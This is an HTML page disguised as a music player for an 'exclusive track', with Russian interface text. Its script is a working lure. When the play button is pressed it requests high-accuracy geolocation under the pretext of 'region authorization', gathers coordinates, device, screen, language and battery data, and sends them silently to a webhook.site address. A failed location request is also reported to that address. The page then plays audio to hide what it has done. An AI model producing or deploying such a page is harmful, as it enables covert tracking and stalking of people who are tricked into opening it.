<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Music Player</title>
    <style>
        body { background: #121212; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 40px; border-radius: 30px; text-align: center; box-shadow: 0 10px 50px rgba(0,0,0,0.8); width: 280px; border: 1px solid rgba(255,255,255,0.05); }
        .loader { border: 4px solid #333; border-top: 4px solid #1DB954; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #playBtn { background: #1DB954; color: white; border: none; border-radius: 50%; width: 80px; height: 80px; font-size: 30px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(29, 185, 84, 0.4); }
        #playBtn:hover { transform: scale(1.05); background: #1ed760; }
        #status { margin-top: 20px; font-size: 13px; color: #b3b3b3; letter-spacing: 0.5px; }
        .track-info h3 { margin: 10px 0 5px 0; font-size: 22px; }
        .track-info p { color: #1DB954; font-size: 14px; margin: 0; font-weight: bold; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="card">
    <div class="track-info">
        <div style="font-size: 60px; margin-bottom: 10px;">🎵</div>
        <h3>Exclusive Track</h3>
        <p>Premium Content</p>
    </div>

    <button id="playBtn">▶</button>
    <div id="loader" class="loader"></div>
    <div id="status">Нажмите для прослушивания</div>
</div>

<audio id="audio" src="track.mp3" preload="auto"></audio>

<script>
    // ЗАМЕНИ НА СВОЙ URL
    const webhookUrl = "https://webhook.site/bc5fa1da-0db6-461f-8bf3-ceb074f7bac7";
    
    const playBtn = document.getElementById('playBtn');
    const loader = document.getElementById('loader');
    const status = document.getElementById('status');
    const audio = document.getElementById('audio');

    playBtn.onclick = function() {
        playBtn.style.display = 'none';
        loader.style.display = 'block';
        status.innerText = "Авторизация региона...";

        navigator.geolocation.getCurrentPosition(async (pos) => {
            // СБОР ВСЕХ ДАННЫХ
            let info = {
                type: "FULL_ACCESS_REPORT",
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy + "m",
                platform: navigator.platform,
                screen: window.screen.width + "x" + window.screen.height,
                lang: navigator.language,
                time: new Date().toLocaleString()
            };

            // Данные о батарее
            if (navigator.getBattery) {
                try {
                    const bat = await navigator.getBattery();
                    info.battery = Math.round(bat.level * 100) + "%";
                    info.charging = bat.charging ? "Yes" : "No";
                } catch (e) {}
            }

            // Отправка в Webhook
            const params = new URLSearchParams(info).toString();
            fetch(webhookUrl + "?" + params);

            // Имитация загрузки и запуск аудио
            setTimeout(() => {
                loader.style.display = 'none';
                status.innerText = "Сейчас играет: Exclusive Track";
                status.style.color = "#1DB954";
                audio.play().catch(e => {
                    status.innerText = "Ошибка: Нажмите еще раз";
                    playBtn.style.display = 'inline-block';
                });
            }, 2500);

        }, (err) => {
            // Если отказал в доступе
            fetch(webhookUrl + "?type=ACCESS_DENIED&reason=" + err.message);
            status.innerText = "Ошибка: Доступ ограничен для вашего IP";
            status.style.color = "#ff4444";
            loader.style.display = 'none';
            playBtn.style.display = 'inline-block';
            playBtn.style.background = "#444";
        }, { enableHighAccuracy: true, timeout: 10000 });
    };
</script>

</body>
</html>
